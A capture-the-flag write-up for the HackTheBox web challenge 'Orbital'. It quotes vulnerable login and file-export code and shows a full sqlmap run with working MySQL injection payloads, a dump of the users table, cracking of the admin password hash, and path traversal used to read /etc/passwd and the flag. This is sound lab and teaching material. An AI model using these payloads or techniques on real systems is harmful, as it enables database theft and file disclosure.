# Orbital
## Description
In order to decipher the alien communication that held the key to their location, she needed access to a decoder with advanced capabilities - a decoder that only The Orbital firm possessed. Can you get your hands on the decoder?

### Difficulty: easy
---
Visiting the site shows us a generic login page. After trying the classic admin:admin and admin:password credentials, perhaps we can find more information on what's happening by viewing the provided source code.
When viewing the `database.py`, we find an interesting hint/note:
```
def login(username, password):
    # I don't think it's not possible to bypass login because I'm verifying the password later.
    user = query(f'SELECT username, password FROM users WHERE username = "{username}"', one=True)

    if user:
        passwordCheck = passwordVerify(user['password'], password)

        if passwordCheck:
            token = createJWT(user['username'])
            return token
    else:
        return False
```
Our SQL injection approach from Drobots has been remedied. Even when we bypass the username input check, the password is verified in a separate instance. Problem solved, or is it?

Before moving on to probing SQL injection further, I check for potentially alternative pages by looking at the `routes.py` file. The only other page is an /export page, that requires a valid JSON token. So we will explore the login bypass further.

Instead of manually checking a variety of SQL payloads, we will employ a tool to make this quick and easy: SQLmap. SQLmap can be easily set up to do post requests by passing it the request information in a file:
```
$ cat post.txt         
POST /api/login HTTP/1.1
Host: 68.183.45.143:30274
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://68.183.45.143:30274/
Content-Type: application/json
Origin: http://68.183.45.143:30274
Content-Length: 42
Connection: close

{"username":"admin","password":"password"}
```


Full sqlmap dump output.
```
$ sqlmap -r post.txt -p username --dbms=mysql --dump 
        ___
       __H__                                                                                                                                                                                                                               
 ___ ___[(]_____ ___ ___  {1.7.2#stable}                                                                                                                                                                                                   
|_ -| . [,]     | .'| . |                                                                                                                                                                                                                  
|___|_  ["]_|_|_|__,|  _|                                                                                                                                                                                                                  
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                               

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:23:08 /2023-03-20/

[19:23:08] [INFO] parsing HTTP request from 'post.txt'
JSON data found in POST body. Do you want to process it? [Y/n/q] y
[19:23:16] [INFO] testing connection to the target URL
[19:23:16] [WARNING] the web server responded with an HTTP error code (403) which could interfere with the results of the tests
[19:23:16] [INFO] checking if the target is protected by some kind of WAF/IPS
[19:23:16] [INFO] testing if the target URL content is stable
[19:23:16] [INFO] target URL content is stable
[19:23:16] [INFO] heuristic (basic) test shows that (custom) POST parameter 'JSON username' might be injectable (possible DBMS: 'MySQL')
[19:23:17] [INFO] testing for SQL injection on (custom) POST parameter 'JSON username'
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] 
[19:23:20] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[19:23:22] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[19:23:22] [INFO] testing 'Generic inline queries'
[19:23:22] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[19:23:25] [WARNING] reflective value(s) found and filtering out
[19:23:28] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[19:23:34] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[19:23:40] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[19:23:51] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[19:24:02] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[19:24:12] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[19:24:23] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[19:24:33] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'
[19:24:52] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'
[19:25:02] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
[19:25:02] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
[19:25:02] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
[19:25:03] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
[19:25:03] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
[19:25:03] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
[19:25:04] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[19:25:04] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[19:25:05] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[19:25:05] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[19:25:05] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
[19:25:12] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
[19:25:12] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[19:25:20] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[19:25:27] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[19:25:35] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[19:25:43] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[19:25:43] [WARNING] potential permission problems detected ('command denied')
[19:25:51] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[19:25:59] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[19:26:06] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[19:26:14] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[19:26:15] [INFO] (custom) POST parameter 'JSON username' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable 
[19:26:15] [INFO] testing 'MySQL inline queries'
[19:26:15] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[19:26:15] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[19:26:15] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[19:26:15] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[19:26:16] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[19:26:16] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[19:26:16] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[19:26:26] [INFO] (custom) POST parameter 'JSON username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[19:26:26] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[19:26:26] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[19:26:26] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[19:26:27] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[19:26:27] [INFO] target URL appears to have 2 columns in query
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] n
n
[19:26:51] [WARNING] if UNION based SQL injection is not detected, please consider usage of option '--union-char' (e.g. '--union-char=1') 
[19:26:54] [INFO] target URL appears to be UNION injectable with 2 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] n
[19:27:02] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[19:27:06] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[19:27:09] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[19:27:12] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[19:27:15] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[19:27:18] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[19:27:21] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[19:27:24] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[19:27:27] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
(custom) POST parameter 'JSON username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 1397 HTTP(s) requests:
---
Parameter: JSON username ((custom) POST)
    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: {"username":"admin" AND (SELECT 2242 FROM(SELECT COUNT(*),CONCAT(0x71716a6a71,(SELECT (ELT(2242=2242,1))),0x71626b7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- IPSK","password":"password"}

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: {"username":"admin" AND (SELECT 4429 FROM (SELECT(SLEEP(5)))Llei)-- Mhzj","password":"password"}
---
[19:27:44] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[19:27:44] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[19:27:44] [INFO] fetching current database
[19:27:45] [INFO] retrieved: 'orbital'
[19:27:45] [INFO] fetching tables for database: 'orbital'
[19:27:45] [INFO] retrieved: 'communication'
[19:27:45] [INFO] retrieved: 'users'
[19:27:45] [INFO] fetching columns for table 'users' in database 'orbital'
[19:27:45] [INFO] retrieved: 'id'
[19:27:46] [INFO] retrieved: 'int(11)'
[19:27:46] [INFO] retrieved: 'username'
[19:27:46] [INFO] retrieved: 'varchar(255)'
[19:27:46] [INFO] retrieved: 'password'
[19:27:46] [INFO] retrieved: 'varchar(255)'
[19:27:46] [INFO] fetching entries for table 'users' in database 'orbital'
[19:27:46] [INFO] retrieved: '1'
[19:27:47] [INFO] retrieved: '1692b753c031f2905b89e7258dbc49bb'
[19:27:47] [INFO] retrieved: 'admin'
[19:27:47] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
[19:28:10] [INFO] writing hashes to a temporary file '/tmp/sqlmapxmrfdr0m9619/sqlmaphashes-xvcfw_me.txt' 
do you want to crack them via a dictionary-based attack? [Y/n/q] y
[19:28:13] [INFO] using hash method 'md5_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[19:28:17] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] n
[19:28:23] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[19:28:23] [INFO] starting 2 processes 
[19:28:33] [INFO] cracked password 'ichliebedich' for user 'admin'                                                                                                                                                                        
Database: orbital                                                                                                                                                                                                                         
Table: users
[1 entry]
+----+-------------------------------------------------+----------+
| id | password                                        | username |
+----+-------------------------------------------------+----------+
| 1  | 1692b753c031f2905b89e7258dbc49bb (ichliebedich) | admin    |
+----+-------------------------------------------------+----------+

[19:28:55] [INFO] table 'orbital.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/68.183.45.143/dump/orbital/users.csv'
[19:28:55] [INFO] fetching columns for table 'communication' in database 'orbital'
[19:28:55] [INFO] retrieved: 'id'
[19:28:55] [INFO] retrieved: 'int(11)'
[19:28:55] [INFO] retrieved: 'source'
[19:28:56] [INFO] retrieved: 'varchar(255)'
[19:28:56] [INFO] retrieved: 'destination'
[19:28:56] [INFO] retrieved: 'varchar(255)'
[19:28:56] [INFO] retrieved: 'name'
[19:28:56] [INFO] retrieved: 'varchar(255)'
[19:28:56] [INFO] retrieved: 'downloadable'
[19:28:57] [INFO] retrieved: 'varchar(255)'
[19:28:57] [INFO] fetching entries for table 'communication' in database 'orbital'
[19:28:57] [INFO] retrieved: 'Arcturus'
[19:28:57] [INFO] retrieved: 'communication.mp3'
[19:28:57] [INFO] retrieved: '1'
[19:28:57] [INFO] retrieved: 'Ice World Calling Red Giant'
[19:28:57] [INFO] retrieved: 'Titan'
[19:28:58] [INFO] retrieved: 'Vega'
[19:28:58] [INFO] retrieved: 'communication.mp3'
[19:28:58] [INFO] retrieved: '2'
[19:28:58] [INFO] retrieved: 'Spiral Arm Salutations'
[19:28:58] [INFO] retrieved: 'Andromeda'
[19:28:58] [INFO] retrieved: 'Trappist-1'
[19:28:58] [INFO] retrieved: 'communication.mp3'
[19:28:59] [INFO] retrieved: '3'
[19:28:59] [INFO] retrieved: 'Lone Star Linkup'
[19:28:59] [INFO] retrieved: 'Proxima Centauri'
[19:28:59] [INFO] retrieved: 'Kepler-438b'
[19:28:59] [INFO] retrieved: 'communication.mp3'
[19:29:00] [INFO] retrieved: '4'
[19:29:00] [INFO] retrieved: 'Small World Symposium'
[19:29:00] [INFO] retrieved: 'TRAPPIST-1h'
[19:29:00] [INFO] retrieved: 'Boop'
[19:29:00] [INFO] retrieved: 'communication.mp3'
[19:29:00] [INFO] retrieved: '5'
[19:29:00] [INFO] retrieved: 'Jelly World Japes'
[19:29:01] [INFO] retrieved: 'Winky'
Database: orbital
Table: communication
[5 entries]
+----+-----------------------------+------------------+-------------+-------------------+
| id | name                        | source           | destination | downloadable      |
+----+-----------------------------+------------------+-------------+-------------------+
| 1  | Ice World Calling Red Giant | Titan            | Arcturus    | communication.mp3 |
| 2  | Spiral Arm Salutations      | Andromeda        | Vega        | communication.mp3 |
| 3  | Lone Star Linkup            | Proxima Centauri | Trappist-1  | communication.mp3 |
| 4  | Small World Symposium       | TRAPPIST-1h      | Kepler-438b | communication.mp3 |
| 5  | Jelly World Japes           | Winky            | Boop        | communication.mp3 |
+----+-----------------------------+------------------+-------------+-------------------+

[19:29:01] [INFO] table 'orbital.communication' dumped to CSV file '/home/kali/.local/share/sqlmap/output/68.183.45.143/dump/orbital/communication.csv'
[19:29:01] [WARNING] HTTP error codes detected during run:
403 (Forbidden) - 913 times, 500 (Internal Server Error) - 546 times
[19:29:01] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/68.183.45.143'

[*] ending @ 19:29:01 /2023-03-20/
```
Running sqlmap quickly picked up the proper payload to use for SQL injection. The payload utilized:
```
Payload: {"username":"admin" AND (SELECT 4429 FROM (SELECT(SLEEP(5)))Llei)-- Mhzj","password":"password"}
```
And fortunately with this, sqlmap is able to grab admin's password from the database. The login credentials are as follows:
```
{"username":"admin","password":"ichliebedich"}
```
Using these credentials gets us in.

Now that we are in, we can see a lot of static information on this page but no flag in plain sight. At the bottom of the page, we see an export option that will prompt us to download a `communication.mp3` file. We saw some information on an export page in the source code, so let's revisit this to get a better idea on what's going on.
In blueprints/test.py:
```
def exportFile():
    if not request.is_json:
        return response('Invalid JSON!'), 400
    
    data = request.get_json()
    communicationName = data.get('name', '')

    try:
        # Everyone is saying I should escape specific characters in the filename. I don't know why.
        return send_file(f'/communications/{communicationName}', as_attachment=True)
    except:
        return response('Unable to retrieve the communication'), 400
```
We see there is a lack of sanitization on how it is grabbing the file to export. If we can edit the file name we are requesting, we can perform directory traversal to grab any file that is not read-protected. To check this, we will look for the always-readable /etc/passwd.
In burpsuite:
Request
![[Pasted image 20230325194705.png]]
Response
![[Pasted image 20230325194718.png]]
We see the contents of /etc/passwd. Now all that remains is to find the flag.
After making several guesses on where the flag might be located, we have yet to find the flag. Back to the source code, perhaps we can see how it is being placed upon initialization by viewing the Dockerfile:
```
$ cat Dockerfile        
FROM python:3.8-alpine

# Install packages
RUN apk add --no-cache --update mariadb mariadb-client supervisor gcc musl-dev mariadb-connector-c-dev

# Upgrade pip
RUN python -m pip install --upgrade pip

# Install dependencies
RUN pip install Flask flask_mysqldb pyjwt colorama

# Setup app
RUN mkdir -p /app
RUN mkdir -p /communication

# Switch working environment
WORKDIR /app

# Add application
COPY challenge .

# Setup supervisor
COPY config/supervisord.conf /etc/supervisord.conf

# Expose port the server is reachable on
EXPOSE 1337

# Disable pycache
ENV PYTHONDONTWRITEBYTECODE=1

# copy flag
COPY flag.txt /signal_sleuth_firmware
COPY files /communications/

# create database and start supervisord
COPY --chown=root entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh
ENTRYPOINT ["/entrypoint.sh"]
```
They did indeed pull a cheeky one on us, note how the flag.txt has been renamed! In this machine it's now called `signal_sleuth_firmware`
In Burpsuite:
Request:
![[Pasted image 20230325195247.png]]
Response:
![[Pasted image 20230325195302.png]]
Flag `HTB{T1m3_b4$3d_$ql1_4r3_fun!!!}`
